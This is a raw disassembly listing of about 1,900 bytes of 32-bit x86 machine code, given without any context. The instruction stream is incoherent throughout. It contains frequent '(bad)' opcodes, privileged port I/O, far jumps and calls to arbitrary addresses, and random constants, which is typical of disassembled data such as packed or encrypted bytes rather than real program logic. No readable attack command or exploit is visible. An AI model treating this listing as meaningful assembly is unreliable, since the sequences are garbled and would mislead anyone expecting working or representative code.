  4173c3:	sbb    ah,BYTE PTR [ecx-0x75cbcd50]
  4173c9:	jmp    0x49849bf1
  4173ce:	inc    ebp
  4173cf:	fistp  WORD PTR [edi]
  4173d1:	pushf  
  4173d2:	retf   0x69c3
  4173d5:	xor    ah,0x72
  4173d8:	not    dl
  4173da:	pushf  
  4173db:	mov    edx,0x980578dd
  4173e0:	sub    ah,BYTE PTR [edi]
  4173e2:	mov    al,ds:0xe505b3d
  4173e7:	paddusb mm5,QWORD PTR [esi]
  4173ea:	sbb    BYTE PTR ds:0x5a1dcd0b,0x84
  4173f1:	aad    0x82
  4173f3:	stos   BYTE PTR es:[edi],al
  4173f4:	cmp    ah,BYTE PTR [edi]
  4173f6:	and    al,0x2b
  4173f8:	dec    edx
  4173f9:	pop    ebx
  4173fa:	mov    ecx,0x238073f3
  4173ff:	sbb    DWORD PTR [ecx+0x3c],edi
  417402:	in     al,0xed
  417404:	(bad)  
  417406:	ficom  WORD PTR [eax+0x651fe]
  41740c:	aas    
  41740d:	addr16 add eax,0x214d84cf
  417413:	pop    eax
  417414:	xchg   edi,eax
  417415:	adc    eax,0x1d876cae
  41741a:	and    bl,0xc
  41741d:	and    ecx,DWORD PTR [esi+0x690ec908]
  417423:	loope  0x4173b0
  417425:	mov    al,bh
  417427:	mov    ds:0xf730897d,ax
  41742d:	jmp    0x8463:0x1e4ceaf1
  417434:	push   0x48441128
  417439:	dec    ebx
  41743a:	retf   0xe7d2
  41743d:	out    dx,eax
  41743e:	push   edi
  41743f:	in     al,dx
  417440:	dec    esi
  417441:	aam    0xb9
  417443:	test   bl,cl
  417445:	fs inc ecx
  417447:	das    
  417448:	in     al,0x11
  41744a:	jmp    0xa84:0x4448276b
  417451:	sbb    ch,ah
  417453:	loope  0x417464
  417455:	fnstsw WORD PTR [esi-0x3a]
  417458:	into   
  417459:	daa    
  41745a:	not    BYTE PTR [edi-0x48]
  41745d:	loope  0x4173ee
  41745f:	lds    edx,FWORD PTR [ebp-0x2290758]
  417465:	dec    esi
  417466:	data16 fdivr DWORD PTR [esi+0x3b]
  41746a:	fdivr  QWORD PTR [edi+esi*2-0x3a]
  41746e:	jo     0x4174b1
  417470:	ins    BYTE PTR es:[edi],dx
  417471:	mov    ebp,0xb0f74f0f
  417476:	stc    
  417477:	fmul   st,st(5)
  417479:	push   edx
  41747a:	xchg   esp,eax
  41747b:	lods   eax,DWORD PTR ds:[esi]
  41747c:	mov    edi,0xe5c5b503
  417481:	arpl   WORD PTR [eax-0x14672e8a],ax
  417487:	mov    dl,0x27
  417489:	dec    ebx
  41748a:	cdq    
  41748b:	das    
  41748c:	cwde   
  41748d:	xchg   esp,eax
  41748e:	les    esi,FWORD PTR [eax+eax*8]
  417491:	mov    ch,0x5f
  417493:	jge    0x4174af
  417495:	inc    edx
  417496:	jno    0x4174d5
  417498:	pop    edx
  417499:	nop
  41749a:	cmp    bh,cl
  41749c:	test   BYTE PTR [esp+ecx*8],cl
  41749f:	or     esp,DWORD PTR [esi-0x2113a62b]
  4174a5:	mov    esi,0x28e7ed37
  4174aa:	js     0x41750d
  4174ac:	mov    ecx,0x479a86d2
  4174b1:	xor    al,0x66
  4174b3:	xor    al,0xbc
  4174b5:	mov    esp,DWORD PTR [edx-0x40]
  4174b8:	xchg   ecx,eax
  4174b9:	sub    BYTE PTR [ebx],bl
  4174bb:	jg     0x4174e9
  4174bd:	push   ecx
  4174be:	hlt    
  4174bf:	dec    esp
  4174c0:	in     eax,0xa
  4174c2:	adc    edi,DWORD PTR [edx]
  4174c4:	jmp    0xbaed322d
  4174c9:	mov    ch,0xa7
  4174cb:	inc    ebp
  4174cc:	jmp    0x78310c41
  4174d1:	jmp    0x417550
  4174d3:	mov    al,0xa0
  4174d5:	test   DWORD PTR [eax+0x49],eax
  4174d8:	addr16 loop 0x4174eb
  4174db:	dec    eax
  4174dc:	mov    ch,0xf1
  4174de:	push   ebp
  4174df:	xor    BYTE PTR [edi],dh
  4174e1:	and    ch,BYTE PTR [ecx+0x53ac630c]
  4174e7:	fidiv  WORD PTR [esi-0x234504f9]
  4174ed:	pusha  
  4174ee:	xchg   edx,eax
  4174ef:	outs   dx,DWORD PTR ds:[esi]
  4174f0:	xor    BYTE PTR [eax],bl
  4174f2:	mov    dl,0x93
  4174f4:	loopne 0x4174d7
  4174f6:	out    dx,al
  4174f7:	xor    dl,dh
  4174f9:	aas    
  4174fa:	loopne 0x417500
  4174fc:	mov    ebp,0x9af724e2
  417501:	inc    edi
  417502:	push   ds
  417503:	or     bh,BYTE PTR [ecx+0x65ba9322]
  417509:	xchg   edi,eax
  41750a:	add    BYTE PTR [edi+0x5e9823bb],0xb0
  417511:	mov    dl,0x76
  417513:	pop    ss
  417514:	xor    dl,0xe2
  417517:	test   al,0x76
  417519:	repnz pop edx
  41751b:	popf   
  41751c:	jge    0x417569
  41751e:	add    esi,DWORD PTR [esi]
  417520:	in     eax,dx
  417521:	mov    cl,0x85
  417523:	fwait
  417524:	xor    al,0x57
  417526:	xchg   esi,eax
  417527:	lea    eax,fs:[esi+ebx*8]
  41752b:	clc    
  41752c:	clc    
  41752d:	jne    0x41758f
  41752f:	or     ebx,0xb07c466a
  417535:	push   0x42
  417537:	scas   al,BYTE PTR es:[edi]
  417538:	jb     0x417562
  41753a:	(bad)  
  41753b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41753c:	ins    DWORD PTR es:[edi],dx
  41753d:	test   DWORD PTR [ecx+0x60],esi
  417540:	dec    esi
  417541:	ins    BYTE PTR es:[edi],dx
  417542:	pop    ds
  417543:	sti    
  417544:	lahf   
  417545:	jmp    0x4174f5
  417547:	pop    edx
  417548:	push   edx
  417549:	fwait
  41754a:	rcl    DWORD PTR [ecx-0x5],0x9e
  41754e:	cmp    DWORD PTR [ecx+ebp*8+0x12],0x63
  417553:	push   esp
  417554:	ss sub ch,ah
  417557:	sub    al,0xe4
  417559:	je     0x417546
  41755b:	mov    edi,0xc7a70a64
  417560:	cwde   
  417561:	popf   
  417562:	call   FWORD PTR [ecx]
  417564:	mov    esp,DWORD PTR [ecx-0x11]
  417567:	test   al,0x17
  417569:	ins    BYTE PTR es:[edi],dx
  41756a:	or     eax,0xbe4d0b12
  41756f:	sbb    DWORD PTR [esi],0x68fe27fc
  417575:	and    al,0xf7
  417577:	dec    ebx
  417578:	jnp    0x41759c
  41757a:	lods   eax,DWORD PTR ds:[esi]
  41757b:	and    DWORD PTR [esi-0x6],0x27b116a1
  417582:	sahf   
  417583:	and    al,0xa9
  417585:	repz jmp 0xbee0:0x3cb58cde
  41758d:	pop    ebp
  41758e:	add    BYTE PTR [ecx],bl
  417590:	or     edi,edx
  417592:	sub    BYTE PTR [ebp-0x2e8dc8cc],ah
  417598:	and    eax,0x6a83e9ba
  41759d:	ja     0x417586
  41759f:	cs imul ebx,edx,0x561dedcc
  4175a6:	mov    dh,BYTE PTR [edi+0x42]
  4175a9:	inc    edi
  4175aa:	adc    eax,0xd539fe00
  4175af:	out    0x9c,eax
  4175b1:	retf   0xe2e0
  4175b4:	loope  0x41758f
  4175b6:	jbe    0x41761a
  4175b8:	push   es
  4175b9:	jb     0x417548
  4175bb:	imul   esp,edx,0x2b
  4175be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175bf:	xchg   ebx,eax
  4175c0:	mov    ecx,0x1687927d
  4175c5:	sar    BYTE PTR [edx+0x6d],cl
  4175c8:	mov    ebx,0x44b40f61
  4175cd:	test   DWORD PTR [ebp+eiz*8-0x4ccb8315],ebx
  4175d4:	jmp    0x17e5:0xf2bcf170
  4175db:	pop    es
  4175dc:	je     0x4175fc
  4175de:	ins    BYTE PTR es:[edi],dx
  4175df:	fnsave ds:0xf044bb76
  4175e5:	rol    BYTE PTR [ecx+ebx*1],1
  4175e8:	iret   
  4175e9:	bound  eax,QWORD PTR [esp+ebp*4]
  4175ec:	aad    0x67
  4175ee:	lea    esi,[esi+esi*8]
  4175f1:	pop    ds
  4175f2:	daa    
  4175f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175f4:	(bad)  
  4175f5:	cld    
  4175f6:	enterw 0x74c8,0x2d
  4175fb:	test   DWORD PTR [eax+edx*4-0x1c570766],esi
  417602:	(bad)  
  417603:	jb     0x41760a
  417605:	mov    eax,0x62390332
  41760a:	or     al,0x1c
  41760c:	cli    
  41760d:	ficomp WORD PTR es:[ecx+ecx*4]
  417611:	mov    bh,0x46
  417613:	(bad)  
  417614:	mov    edi,0x5ef2b794
  417619:	jg     0x41764a
  41761b:	cdq    
  41761c:	stos   DWORD PTR es:[edi],eax
  41761d:	dec    esp
  41761e:	addr16 push ds
  417620:	push   esp
  417621:	sbb    al,0x73
  417623:	test   DWORD PTR [esp],ecx
  417626:	(bad)  
  417627:	and    al,0xa9
  417629:	sub    BYTE PTR [eax+0x2f],al
  41762c:	sub    bh,BYTE PTR [edi+0x5234b917]
  417632:	jecxz  0x4175e8
  417634:	arpl   WORD PTR [ecx+edx*4-0x33],sp
  417638:	sti    
  417639:	xor    DWORD PTR [edx-0x68],ecx
  41763c:	dec    esi
  41763d:	dec    ebp
  41763e:	mov    cl,0xf2
  417640:	push   eax
  417641:	mov    es,WORD PTR [ecx-0x1b]
  417644:	xchg   ebp,eax
  417645:	enter  0xd7d1,0x3d
  417649:	imul   edi,DWORD PTR [esi-0x5fef8a4e],0xa535a7f8
  417653:	xchg   ebx,eax
  417654:	ins    DWORD PTR es:[edi],dx
  417655:	mov    bh,0x4
  417657:	cmp    eax,0x5a032291
  41765c:	lock push ds
  41765e:	cs sub al,0x74
  417661:	add    dl,BYTE PTR [edi+0x590c325f]
  417667:	sbb    BYTE PTR [eax+edi*1-0x75d03874],cl
  41766e:	push   ds
  41766f:	aaa    
  417670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417671:	mov    ebx,0xa0d086bf
  417676:	inc    ebp
  417677:	cmp    ch,BYTE PTR [eax]
  417679:	lahf   
  41767a:	fcmovu st,st(7)
  41767c:	jl     0x4176c6
  41767e:	mov    eax,ds:0x91a44947
  417683:	sub    BYTE PTR [esi],cl
  417685:	mov    ebx,0x578ca02
  41768a:	retf   
  41768b:	jns    0x41767b
  41768d:	es mov esp,0x1ada9f38
  417693:	out    0xee,al
  417695:	loop   0x417697
  417697:	push   ebp
  417698:	test   eax,0x22c6882a
  41769d:	and    bl,BYTE PTR [edx-0x1]
  4176a0:	mov    DWORD PTR [eax],ebx
  4176a2:	das    
  4176a3:	sti    
  4176a4:	sub    BYTE PTR [eax],cl
  4176a6:	jg     0x417715
  4176a8:	cli    
  4176a9:	inc    esp
  4176aa:	and    eax,0x6003815e
  4176af:	xchg   DWORD PTR [ecx-0x20e2cb77],edi
  4176b5:	stos   DWORD PTR es:[edi],eax
  4176b6:	cmp    al,0xc3
  4176b8:	repz cs lahf 
  4176bb:	mov    edx,DWORD PTR [edi-0x144ed3de]
  4176c1:	fcomip st,st(1)
  4176c3:	xor    eax,0x24144745
  4176c8:	(bad)  
  4176c9:	push   edx
  4176ca:	or     al,0x30
  4176cc:	pop    esp
  4176cd:	call   0xff37:0x12efa36c
  4176d4:	out    dx,eax
  4176d5:	sub    esp,esi
  4176d7:	xor    esp,DWORD PTR [ebx]
  4176d9:	sbb    BYTE PTR [ecx+eiz*1+0x63],bl
  4176dd:	sub    ebp,edx
  4176df:	jecxz  0x4176a8
  4176e1:	xor    al,0xba
  4176e3:	or     dl,BYTE PTR [eax]
  4176e5:	es cld 
  4176e7:	cmp    al,0x5b
  4176e9:	(bad)  
  4176ea:	xchg   ecx,eax
  4176eb:	repnz enter 0x97dc,0xf
  4176f0:	jmp    0x4176e5
  4176f2:	(bad)  
  4176f3:	outs   dx,DWORD PTR ds:[esi]
  4176f4:	cwde   
  4176f5:	jge    0x41768d
  4176f7:	mov    bl,0x26
  4176f9:	add    eax,0x66eb1872
  4176fe:	stos   BYTE PTR es:[edi],al
  4176ff:	sbb    BYTE PTR [esi-0x1fc43be4],al
  417705:	add    eax,0x3fd19a50
  41770a:	pop    esp
  41770b:	push   ebx
  41770c:	add    eax,0xce1003f5
  417711:	dec    ebp
  417712:	lea    eax,[edi-0xf]
  417715:	jle    0x417768
  417717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417718:	cmp    BYTE PTR [eax-0x2b3527b3],0xbc
  41771f:	cmp    bl,BYTE PTR ds:0x5b01132f
  417725:	div    DWORD PTR [esi]
  417727:	fst    st(0)
  417729:	push   ebx
  41772a:	xor    BYTE PTR [ecx-0x6792a494],dh
  417730:	mov    dl,0xc6
  417732:	mov    ds:0x38cd3de1,eax
  417737:	push   edx
  417738:	fsubr  st,st(2)
  41773a:	add    dl,BYTE PTR [eax-0x2054ee51]
  417740:	jmp    0x5111:0xcff24e6b
  417747:	repnz inc edi
  417749:	pop    ss
  41774a:	jno    0x417720
  41774c:	leave  
  41774d:	mov    ah,0xfd
  41774f:	scas   al,BYTE PTR es:[di]
  417751:	int3   
  417752:	nop
  417753:	mov    BYTE PTR [esi+0x7b],0x9
  417757:	add    bl,cl
  417759:	mov    dh,0xcb
  41775b:	inc    ebx
  41775c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41775d:	jns    0x417763
  41775f:	cmp    al,0xbb
  417761:	repz mov ecx,0x59bf2625
  417767:	mov    edx,0xd40eddef
  41776c:	mov    eax,0xdb0da5e
  417771:	imul   eax,DWORD PTR [ecx],0xffffffe5
  417774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417775:	popa   
  417776:	cmp    al,BYTE PTR ds:0x4adebbd9
  41777c:	sub    cl,dl
  41777e:	push   ebp
  41777f:	imul   eax,DWORD PTR ss:[ebx],0x4
  417783:	repnz shr al,0x7
  417787:	cmp    DWORD PTR [edi],ebp
  417789:	jg     0x417749
  41778b:	pop    edi
  41778c:	dec    ebx
  41778d:	daa    
  41778e:	jo     0x417747
  417790:	pop    ss
  417791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417792:	xchg   esp,eax
  417793:	test   dh,al
  417795:	scas   al,BYTE PTR es:[edi]
  417796:	(bad)  
  417797:	dec    esi
  417798:	sub    DWORD PTR [edi+0x76],esp
  41779b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41779c:	rcr    ebp,cl
  41779e:	mov    ds:0x6951d54b,al
  4177a3:	mov    edi,edx
  4177a5:	jmp    0x41779c
  4177a7:	(bad)  
  4177a8:	fwait
  4177a9:	dec    ecx
  4177aa:	call   0xddcac7e6
  4177af:	xor    dl,BYTE PTR [ebx+0x74]
  4177b2:	or     eax,0x5a8b51ce
  4177b7:	mov    eax,0xa595ee9f
  4177bc:	test   BYTE PTR [esi-0x2c],ah
  4177bf:	push   ebp
  4177c1:	stos   BYTE PTR es:[edi],al
  4177c2:	loopne 0x417833
  4177c4:	pop    ebx
  4177c5:	mov    ah,0x62
  4177c7:	cs loope 0x41783d
  4177ca:	jp     0x4177f3
  4177cc:	pusha  
  4177cd:	pop    eax
  4177ce:	imul   esp,esp,0x53
  4177d1:	and    bl,BYTE PTR [ecx+0x22]
  4177d4:	dec    ecx
  4177d5:	pop    ebx
  4177d6:	dec    edi
  4177d7:	fstp   st(0)
  4177d9:	dec    esp
  4177da:	or     esp,DWORD PTR [ebx+0x58]
  4177dd:	mov    ecx,edx
  4177df:	clc    
  4177e0:	xor    al,0x7b
  4177e2:	mov    ss,WORD PTR [edi]
  4177e4:	inc    edi
  4177e5:	popa   
  4177e6:	add    eax,0xf05c8fc2
  4177eb:	in     al,0xb9
  4177ed:	add    DWORD PTR [edi],edx
  4177ef:	repz xchg edi,eax
  4177f1:	js     0x41777a
  4177f3:	sbb    bh,dh
  4177f5:	int3   
  4177f6:	aam    0x3e
  4177f8:	jno    0x417821
  4177fa:	jmp    0x4177bb
  4177fc:	ficom  DWORD PTR [esi]
  4177fe:	fld    DWORD PTR [edx]
  417800:	int3   
  417801:	xor    eax,0x69436cc4
  417806:	fwait
  417807:	push   ebp
  417808:	sub    al,BYTE PTR [ecx+esi*2-0x2c182b60]
  41780f:	pop    eax
  417810:	dec    esp
  417811:	push   0xa926c63a
  417816:	jle    0x4177b9
  417818:	add    ebx,ebp
  41781a:	jae    0x41784f
  41781c:	inc    ebp
  41781d:	pop    es
  41781e:	xor    BYTE PTR [edi],bl
  417820:	arpl   bx,dx
  417822:	lods   al,BYTE PTR ds:[esi]
  417823:	or     esi,ebp
  417825:	js     0x41786a
  417827:	jns    0x4177e5
  417829:	add    eax,0xc29cbc99
  41782e:	xor    ebx,DWORD PTR [eax-0x69]
  417831:	cmp    BYTE PTR [ebx],bh
  417833:	or     edi,0xffffffaf
  417836:	dec    esp
  417837:	mov    ebx,0xb605152e
  41783c:	mov    ecx,0x9679ce5d
  417841:	adc    al,0x52
  417843:	aaa    
  417844:	adc    al,0x9c
  417846:	(bad)
  417849:	or     esi,edi
  41784b:	fidivr WORD PTR [ebx+0x7b0798b0]
  417851:	(bad)  
  417852:	icebp  
  417853:	sub    al,0x45
  417855:	cwde   
  417856:	push   edi
  417857:	add    cl,BYTE PTR [ecx-0x6ca87fbd]
  41785d:	sbb    BYTE PTR ds:[ebp-0x75f16696],0x1e
  417865:	mov    bl,0x48
  417867:	jg     0x417804
  417869:	cs jp  0x417878
  41786c:	addr16 pop esi
  41786e:	xor    esi,ecx
  417870:	int    0x25
  417872:	in     al,0x50
  417874:	cdq    
  417875:	and    ch,BYTE PTR [esi-0x51]
  417878:	pusha  
  417879:	ficom  DWORD PTR [eax-0x32b18e07]
  41787f:	sub    al,0xd
  417881:	push   ds
  417882:	div    dh
  417884:	neg    DWORD PTR [ecx]
  417886:	push   esi
  417887:	rcr    ebx,cl
  417889:	dec    esi
  41788a:	pop    ecx
  41788b:	sbb    BYTE PTR [esi-0x80],ch
  41788e:	loope  0x417843
  417890:	gs test eax,0x3cd61886
  417896:	scas   al,BYTE PTR es:[edi]
  417897:	add    BYTE PTR [ebx+0x14],0x92
  41789b:	div    DWORD PTR [esi-0x80]
  41789e:	outs   dx,DWORD PTR ds:[esi]
  41789f:	adc    BYTE PTR [eax],ch
  4178a1:	mov    eax,ds:0xdac1188f
  4178a6:	outs   dx,BYTE PTR ds:[esi]
  4178a7:	push   ebp
  4178a8:	xlat   BYTE PTR ds:[ebx]
  4178a9:	sbb    esp,DWORD PTR gs:[edi-0x12b326b6]
  4178b0:	test   al,0x81
  4178b2:	dec    edx
  4178b3:	inc    edx
  4178b4:	lods   al,BYTE PTR ds:[esi]
  4178b5:	leave  
  4178b6:	pop    ds
  4178b7:	jp     0x41784d
  4178b9:	inc    edx
  4178ba:	call   0x943e4900
  4178bf:	loop   0x417919
  4178c1:	sbb    eax,0xfc029800
  4178c6:	retf   0x8a43
  4178c9:	xchg   bl,cl
  4178cb:	cdq    
  4178cc:	mov    esp,0xd9f47b06
  4178d1:	mov    ebp,edx
  4178d3:	fcom   QWORD PTR [ecx+ebp*2+0x22b63246]
  4178da:	push   eax
  4178db:	lahf   
  4178dc:	outs   dx,DWORD PTR ds:[esi]
  4178dd:	cs stos DWORD PTR es:[edi],eax
  4178df:	pop    ds
  4178e0:	jmp    0x417885
  4178e2:	mov    esi,0xe149ea14
  4178e7:	xchg   edi,eax
  4178e8:	xchg   esp,eax
  4178e9:	mov    ds:0xf52ff92e,eax
  4178ee:	inc    ebp
  4178ef:	mov    BYTE PTR [ecx+eiz*2],0x6c
  4178f3:	jg     0x41795f
  4178f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f6:	pop    eax
  4178f7:	push   ebp
  4178f8:	mov    DWORD PTR [ecx+esi*4-0x1c3f5056],ebx
  4178ff:	add    ah,bl
  417901:	sub    esi,DWORD PTR [esi]
  417903:	and    DWORD PTR [ecx+ebp*2+0x5179e486],ebp
  41790a:	xchg   DWORD PTR [esi-0x20],esp
  41790d:	(bad)  
  41790e:	cmc    
  41790f:	and    eax,0x1528147d
  417914:	add    al,0x4f
  417916:	icebp  
  417917:	cs std 
  417919:	xor    al,0x25
  41791b:	mov    ds:0x2ae45232,al
  417920:	ficom  DWORD PTR [edi+0x7e]
  417923:	rcl    DWORD PTR [edx-0x1f],0x97
  417927:	cld    
  417928:	pusha  
  417929:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41792b:	call   0x18358750
  417930:	out    dx,al
  417931:	jb     0x4178c9
  417933:	cmp    DWORD PTR [edx+0x475643b0],0xd729cb7d
  41793d:	cmp    DWORD PTR [ebp-0x6a],esi
  417940:	xlat   BYTE PTR ds:[ebx]
  417941:	std    
  417942:	scas   eax,DWORD PTR es:[edi]
  417943:	mov    edi,0x6274bbb6
  417948:	sub    dh,BYTE PTR [edi+0x43]
  41794b:	xchg   DWORD PTR [ecx+0x6c6e7c34],esp
  417951:	xchg   esi,eax
  417952:	dec    ebx
  417953:	out    dx,al
  417954:	data16 test dh,bl
  417957:	lods   al,BYTE PTR ds:[esi]
  417958:	scas   eax,DWORD PTR es:[edi]
  417959:	imul   esp,DWORD PTR [ebp+0x47],0xfffffff7
  41795d:	xor    DWORD PTR [ebp+0x351c221f],ebp
  417963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417964:	or     edx,ecx
  417966:	ja     0x4179a3
  417968:	aas    
  417969:	jmp    0x4179e5
  41796b:	xchg   ebp,eax
  41796c:	sti    
  41796d:	(bad)  
  41796e:	fist   DWORD PTR [esi-0x584775fe]
  417974:	fsub   QWORD PTR [edx+0x1]
  417977:	pusha  
  417978:	add    esp,DWORD PTR [edi]
  41797a:	arpl   di,cx
  41797c:	jp     0x417921
  41797e:	jnp    0x41792b
  417980:	xor    al,0x6d
  417982:	sub    al,0x90
  417984:	ss xchg bl,ch
  417987:	(bad)  
  417988:	push   ebp
  417989:	add    al,0xf3
  41798b:	dec    esi
  41798c:	mov    bh,BYTE PTR [eax+0x6e]
  41798f:	scas   al,BYTE PTR es:[edi]
  417990:	inc    esi
  417991:	jmp    0x417933
  417993:	push   edi
  417994:	push   ebx
  417995:	idiv   BYTE PTR [ecx+0x12a7cdc5]
  41799b:	mov    bh,BYTE PTR [eax]
  41799d:	dec    esi
  41799e:	jns    0x4179ce
  4179a0:	and    BYTE PTR [ecx],0x9c
  4179a3:	adc    al,0xce
  4179a5:	lea    ebp,[eax-0x6e]
  4179a8:	jecxz  0x4179f0
  4179aa:	adc    DWORD PTR [eax+edx*4],edx
  4179ad:	inc    ecx
  4179ae:	and    al,0x3e
  4179b0:	fs push ds
  4179b2:	adc    eax,0x4f6a11b5
  4179b8:	ficomp WORD PTR [ebx]
  4179ba:	out    dx,al
  4179bb:	jle    0x4179d6
  4179bd:	push   ebp
  4179be:	in     eax,dx
  4179bf:	inc    ebx
  4179c0:	(bad)  
  4179c1:	push   ebp
  4179c2:	ret    
  4179c3:	mov    bl,0xf7
  4179c5:	fld    QWORD PTR [eax-0x8492552]
  4179cb:	idiv   BYTE PTR [eax-0x80]
  4179ce:	es rcr dh,cl
  4179d1:	rcr    esi,1
  4179d3:	fcmovnbe st,st(7)
  4179d5:	daa    
  4179d6:	outs   dx,DWORD PTR ds:[esi]
  4179d7:	or     BYTE PTR [ebp+0x67f1ff4c],ah
  4179dd:	sub    BYTE PTR [eax-0x4c601292],0xd4
  4179e4:	lods   eax,DWORD PTR ds:[esi]
  4179e5:	or     BYTE PTR [edi+ecx*1+0x65f86fdf],bl
  4179ec:	sub    edi,esi
  4179ee:	stos   BYTE PTR es:[edi],al
  4179ef:	not    DWORD PTR [edx-0x26]
  4179f2:	jbe    0x4179c0
  4179f4:	sbb    eax,0xc98e5206
  4179f9:	rcr    BYTE PTR [ebx+0x6bc048bb],0x8
  417a00:	dec    esp
  417a01:	rcl    DWORD PTR [esi],1
  417a03:	popa   
  417a04:	and    eax,0xd55a9b38
  417a09:	mov    al,ds:0xc1d83496
  417a0e:	push   0xffffff87
  417a10:	and    DWORD PTR [edx],eax
  417a12:	out    dx,eax
  417a13:	mov    eax,ds:0x2f721f5e
  417a18:	int3   
  417a19:	out    0xc3,eax
  417a1b:	repnz or esi,DWORD PTR [ebx-0x4f36c3f2]
  417a22:	shl    DWORD PTR [ebx+0x6e],1
  417a25:	jno    0x417a1d
  417a27:	push   ecx
  417a28:	repnz add dh,al
  417a2b:	sbb    ch,BYTE PTR [bx+si+0x40]
  417a2f:	(bad)  
  417a31:	jbe    0x4179ff
  417a33:	daa    
  417a34:	fild   WORD PTR [esi+0x47a8117c]
  417a3a:	pop    esi
  417a3b:	in     eax,dx
  417a3c:	rol    BYTE PTR [ebp+0x1e],0x21
  417a40:	(bad)  
  417a41:	(bad)  
  417a42:	add    eax,0x8a1408da
  417a47:	jnp    0x417a5b
  417a49:	shr    DWORD PTR [esi-0x41096f57],1
  417a4f:	(bad)  
  417a50:	je     0x417a27
  417a52:	dec    eax
  417a53:	sbb    eax,0xb113388b
  417a58:	cld    
  417a59:	mov    ds:0x81589dc,eax
  417a5e:	leave  
  417a5f:	ja     0x417a63
  417a61:	xor    bl,BYTE PTR [ebx+0x9295245]
  417a67:	lea    esp,[eax+0x2d7896f9]
  417a6d:	pop    ebx
  417a6e:	jmp    0x417a4f
  417a70:	fst    QWORD PTR [eax+0x5d]
  417a73:	pop    ebx
  417a74:	test   BYTE PTR [esi+0x571d03e9],0x9d
  417a7b:	pusha  
  417a7c:	cmp    al,0x1a
  417a7e:	adc    al,0xae
  417a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a81:	ins    DWORD PTR es:[edi],dx
  417a82:	dec    esp
  417a83:	push   0x3ced097a
  417a88:	xchg   ecx,eax
  417a89:	pop    ebp
  417a8a:	call   0x408d:0xa41b37e9
  417a91:	mov    cl,0xec
  417a93:	jecxz  0x417af2
  417a95:	pop    ds
  417a96:	sbb    esp,DWORD PTR [edx+0x72b3a5fd]
  417a9c:	mov    al,ds:0x92380f6a
  417aa1:	stos   BYTE PTR es:[edi],al
  417aa2:	data16 ss sub bh,cl
  417aa6:	pop    ss
  417aa7:	and    al,0x57
  417aa9:	mov    ecx,0xc7732635
  417aae:	adc    dh,al
  417ab0:	jb     0x417b2e
  417ab2:	fmul   DWORD PTR [ecx+0x5]
  417ab5:	xor    al,0x8e
  417ab7:	aam    0x26
  417ab9:	bound  eax,QWORD PTR gs:[eax+ebx*8+0x4e]
  417abe:	mov    ds:0xf7c8c67d,eax
  417ac3:	add    ebx,esi
  417ac5:	dec    edx
  417ac6:	mov    ebp,0x8d91be0d
  417acb:	ins    DWORD PTR es:[edi],dx
  417acc:	dec    ebx
  417acd:	mov    WORD PTR [edx-0x7ed15225],cs
  417ad3:	popa   
  417ad4:	lahf   
  417ad5:	sti    
  417ad6:	loop   0x417a62
  417ad8:	ffreep st(3)
  417ada:	aaa    
  417adb:	cmp    eax,0x35722ce8
  417ae0:	loop   0x417af9
  417ae2:	jg     0x417acf
  417ae4:	adc    DWORD PTR [ebx+0x4d],eax
  417ae7:	in     eax,dx
  417ae8:	outs   dx,BYTE PTR ds:[esi]
  417ae9:	out    dx,al
  417aea:	sbb    eax,0x4c179cd7
  417aef:	arpl   WORD PTR [ebx],sp
  417af1:	loop   0x417ab1
  417af3:	pushaw 
  417af5:	push   edx
  417af6:	mov    WORD PTR [esi],?
  417af8:	stc    
  417af9:	das    
  417afa:	loop   0x417b72
  417afc:	xor    al,0x6b
  417afe:	out    0xda,eax
  417b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b01:	ret    0xe337
  417b04:	and    BYTE PTR [ebp-0x6a],0x2f
  417b08:	pop    eax
  417b09:	pop    ecx
  417b0a:	dec    edi
  417b0b:	mov    ds:0xa8ef52fa,al
  417b10:	stos   BYTE PTR es:[edi],al
  417b11:	xchg   edx,eax
  417b12:	imul   edi,ebx,0xa1840d25
  417b18:	pop    esp
  417b19:	ins    DWORD PTR es:[edi],dx
  417b1a:	in     eax,0xd5
  417b1c:	dec    ebp
  417b1d:	inc    ebx
  417b1e:	mov    cl,0x78
  417b20:	or     DWORD PTR [ecx-0x42],ebx
  417b23:	fmul   DWORD PTR [eax+0x24]
  417b26:	shl    BYTE PTR [ebx+0x53],1
  417b29:	mov    bl,0x55
  417b2b:	cld    
  417b2c:	ret    0xb08f
  417b2f:	mov    ah,0x17
  417b31:	mov    ebx,0xc3b05280
  417b36:	inc    eax
  417b37:	jae    0x417b47
  417b39:	mov    ecx,0x9f063808
  417b3e:	inc    edx
  417b3f:	out    dx,al
  417b40:	in     al,dx
  417b41:	ja     0x417b10
  417b43:	fmul   QWORD PTR [edx-0x52]
  417b46:	(bad)  
  417b48:	mov    cl,0xc9
  417b4a:	mov    BYTE PTR ds:0x6fd08f6a,al
  417b51:	inc    eax
  417b52:	cmp    edi,DWORD PTR [esi+0x2e]
  417b55:	jmp    0x417aec
  417b57:	mov    ah,0x2e
  417b59:	js     0x417bb8
  417b5b:	add    DWORD PTR [esi+0x25],esp
  417b5e:	test   al,0x1d
  417b60:	in     eax,dx
  417b61:	aad    0x76
  417b63:	mov    edx,0x8c97368f
  417b68:	and    dh,ch
  417b6a:	cdq    
  417b6b:	add    ah,cl
  417b6d:	out    dx,al
  417b6e:	jmp    0xb2af:0xa6ae0029
  417b75:	xchg   edx,eax
  417b76:	sbb    al,0xd8
  417b78:	js     0x417b28
  417b7a:	loope  0x417b9f
  417b7c:	(bad)  
  417b7d:	xchg   esi,eax
  417b7e:	ins    BYTE PTR es:[edi],dx
  417b7f:	xchg   BYTE PTR [esi-0x28bbc70a],dl
  417b85:	jmp    0x567d:0xb83726fb
  417b8c:	mov    ch,0xbf
  417b8e:	pop    edi
